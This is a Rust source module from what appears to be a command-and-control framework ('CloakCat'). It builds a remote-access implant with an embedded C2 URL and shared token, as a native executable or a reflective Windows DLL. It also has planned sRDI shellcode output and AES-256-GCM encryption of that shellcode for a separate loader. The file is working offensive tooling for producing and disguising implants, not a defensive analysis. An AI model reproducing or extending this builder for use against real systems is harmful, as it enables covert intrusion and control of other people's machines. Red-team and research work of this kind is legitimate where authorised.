//! Agent binary / DLL build (embed config, cargo build, copy output).

use std::fs;
use std::path::{Path, PathBuf};
use std::str::FromStr;

use anyhow::{anyhow, Result};

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct AgentBuildConfig {
    pub c2_url: String,
    pub profile_name: String,
    pub shared_token: String,
    pub alias: String,
    pub note: Option<String>,
}

#[derive(Debug, Clone, Copy)]
pub enum Os {
    Linux,
    Windows,
}

impl FromStr for Os {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        let lower = s.to_lowercase();
        match lower.as_str() {
            "linux" => Ok(Os::Linux),
            "windows" | "win" | "win32" | "win64" => Ok(Os::Windows),
            other => Err(format!("unsupported os: {other} (use: linux | windows)")),
        }
    }
}

/// Output format for the built agent.
#[derive(Debug, Clone, Copy, Default)]
pub enum Format {
    /// Native executable (default)
    #[default]
    Exe,
    /// Reflective DLL (`cdylib`)
    Dll,
    /// Position-independent shellcode via sRDI (Phase 8-3)
    Shellcode,
}

impl FromStr for Format {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "exe" => Ok(Format::Exe),
            "dll" => Ok(Format::Dll),
            "shellcode" => Ok(Format::Shellcode),
            other => Err(format!(
                "unsupported format: {other} (use: exe | dll | shellcode)"
            )),
        }
    }
}

#[derive(Debug)]
pub struct BuildAgentArgs {
    pub os: Os,
    pub format: Format,
    pub alias: String,
    pub c2_url: String,
    pub profile: String,
    pub shared_token: String,
    pub output_dir: PathBuf,
    pub name: String,
    pub note: Option<String>,
    /// Encrypt shellcode output with AES-256-GCM (shellcode format only).
    pub encrypt: bool,
}

/// Encrypt `data` with AES-256-GCM.
///
/// Output format: `[12-byte nonce][ciphertext + 16-byte tag]`
///
/// Compatible with shellcode_loader's `-e aes -k <hex_key>` option.
/// Returns `(ciphertext_blob, key_as_64_hex_chars)`.
// aes-gcm 0.10 uses generic-array 0.14 whose from_slice is deprecated in 1.x.
// The warning is internal to the crate version chosen; suppress it here.
#[allow(deprecated)]
fn encrypt_aes_gcm(data: &[u8]) -> Result<(Vec<u8>, String)> {
    use aes_gcm::aead::Aead;
    use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce};
    use rand::RngCore;

    let mut key_bytes = [0u8; 32];
    rand::rng().fill_bytes(&mut key_bytes);

    let mut nonce_bytes = [0u8; 12];
    rand::rng().fill_bytes(&mut nonce_bytes);

    let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    let cipher = Aes256Gcm::new(key);

    let ciphertext = cipher
        .encrypt(nonce, data)
        .map_err(|e| anyhow!("AES-256-GCM encrypt failed: {e}"))?;

    let mut blob = Vec::with_capacity(12 + ciphertext.len());
    blob.extend_from_slice(&nonce_bytes);
    blob.extend_from_slice(&ciphertext);

    Ok((blob, hex::encode(key_bytes)))
}

fn workspace_root() -> PathBuf {
    let cli_dir = Path::new(env!("CARGO_MANIFEST_DIR"));
    cli_dir
        .parent()
        .expect("no parent for CARGO_MANIFEST_DIR")
        .to_path_buf()
}

pub fn build_agent(args: BuildAgentArgs) -> Result<()> {
    // DLL / shellcode only make sense for Windows.
    if matches!(args.format, Format::Dll | Format::Shellcode) {
        if !matches!(args.os, Os::Windows) {
            return Err(anyhow!("dll/shellcode format requires --os windows"));
        }
    }

    let root = workspace_root();

    let cfg = AgentBuildConfig {
        c2_url: args.c2_url.clone(),
        profile_name: args.profile.clone(),
        shared_token: args.shared_token.clone(),
        alias: args.alias.clone(),
        note: args.note.clone(),
    };
    let cfg_json = serde_json::to_string(&cfg)?;

    println!(
        "[build-agent] starting cargo build for cat-agent (os={:?}, format={:?}, alias={})...",
        args.os, args.format, args.alias
    );

    match args.format {
        Format::Exe => build_exe(&root, &args, &cfg_json),
        Format::Dll => build_dll(&root, &args, &cfg_json),
        Format::Shellcode => {
            // Phase 8-3: build DLL first, then convert via sRDI.
            build_dll(&root, &args, &cfg_json)?;
            println!(
                "[build-agent] NOTE: shellcode (sRDI) conversion not yet implemented — \
                 the .dll has been placed in the output directory. \
                 sRDI conversion will be added in Phase 8-3."
            );
            Ok(())
        }
    }
}

fn build_exe(root: &Path, args: &BuildAgentArgs, cfg_json: &str) -> Result<()> {
    let (target_arg, bin_path): (Option<&str>, PathBuf) = match args.os {
        Os::Linux => (None, root.join("target").join("release").join("cat-agent")),
        Os::Windows => (
            Some("x86_64-pc-windows-gnu"),
            root.join("target")
                .join("x86_64-pc-windows-gnu")
                .join("release")
                .join("cat-agent.exe"),
        ),
    };

    let mut cmd = std::process::Command::new("cargo");
    cmd.current_dir(root)
        .env("CLOAKCAT_EMBED_CONFIG", cfg_json)
        .arg("build")
        .arg("-p")
        .arg("cat-agent")
        .arg("--bin")
        .arg("cat-agent")
        .arg("--release")
        .stdout(std::process::Stdio::inherit())
        .stderr(std::process::Stdio::inherit());
    if let Some(triple) = target_arg {
        cmd.arg("--target").arg(triple);
    }
    let status = cmd.status()?;
    if !status.success() {
        return Err(anyhow!("cargo build failed"));
    }

    copy_output(&bin_path, args, ".exe")
}

fn build_dll(root: &Path, args: &BuildAgentArgs, cfg_json: &str) -> Result<()> {
    // DLL is always Windows cross-compiled.
    let bin_path = root
        .join("target")
        .join("x86_64-pc-windows-gnu")
        .join("release")
        .join("cat_agent.dll");

    let mut cmd = std::process::Command::new("cargo");
    cmd.current_dir(root)
        .env("CLOAKCAT_EMBED_CONFIG", cfg_json)
        .arg("build")
        .arg("-p")
        .arg("cat-agent")
        .arg("--lib")
        .arg("--release")
        .arg("--target")
        .arg("x86_64-pc-windows-gnu")
        .stdout(std::process::Stdio::inherit())
        .stderr(std::process::Stdio::inherit());
    let status = cmd.status()?;
    if !status.success() {
        return Err(anyhow!("cargo build --lib failed"));
    }

    copy_output(&bin_path, args, ".dll")
}

fn copy_output(bin_path: &Path, args: &BuildAgentArgs, ext: &str) -> Result<()> {
    println!("[build-agent] cargo build finished, locating output...");
    if !bin_path.exists() {
        return Err(anyhow!(
            "built artifact not found at {} (check target toolchain)",
            bin_path.display()
        ));
    }

    fs::create_dir_all(&args.output_dir)?;
    let mut dest = args.output_dir.join(&args.name);
    let lower = dest.to_string_lossy().to_lowercase();
    if !lower.ends_with(ext) {
        dest.set_extension(&ext[1..]); // strip leading '.'
    }
    fs::copy(bin_path, &dest)?;
    println!("[build-agent] done. saved to {}", dest.display());
    Ok(())
}
